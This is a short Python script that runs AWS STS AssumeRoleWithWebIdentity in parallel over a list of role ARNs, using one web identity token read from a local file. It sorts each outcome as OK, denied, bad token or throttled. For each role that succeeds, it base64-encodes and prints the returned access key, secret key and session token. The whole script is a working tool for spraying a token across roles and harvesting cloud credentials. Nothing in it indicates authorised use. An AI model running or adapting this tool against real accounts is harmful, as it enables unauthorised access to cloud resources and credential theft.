import urllib.request,urllib.parse,urllib.error,json,sys,re,base64,concurrent.futures as cf
idtok=open('/tmp/id').read().strip()
roles=[l.strip() for l in open('roles.txt') if l.strip()]
def one(role):
    data=urllib.parse.urlencode({"Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15","RoleArn":role,"RoleSessionName":"sess","WebIdentityToken":idtok,"DurationSeconds":"3600"}).encode()
    req=urllib.request.Request("https://sts.amazonaws.com/",data=data)
    try:
        t=urllib.request.urlopen(req,timeout=25).read().decode()
    except urllib.error.HTTPError as e:
        t=e.read().decode()
    except Exception as e:
        return (role,'exc:'+str(e)[:30],None)
    if '<Credentials>' in t:
        ak=re.search(r'<AccessKeyId>([^<]+)',t).group(1)
        sk=re.search(r'<SecretAccessKey>([^<]+)',t).group(1)
        st=re.search(r'<SessionToken>([^<]+)',t).group(1)
        return (role,'OK',base64.b64encode(("%s|%s|%s"%(ak,sk,st)).encode()).decode())
    if 'AccessDenied' in t: return (role,'denied',None)
    if 'InvalidIdentityToken' in t: return (role,'bad',None)
    if 'Throttl' in t: return (role,'throttle',None)
    return (role,'?',None)
counts={}
oks=[]
with cf.ThreadPoolExecutor(12) as ex:
    for (role,st,bl) in ex.map(one,roles):
        counts[st]=counts.get(st,0)+1
        if st=='OK':
            oks.append((role,bl)); print("OKANN:"+role+"|"+bl)
print("SUMMARY:"+json.dumps(counts))
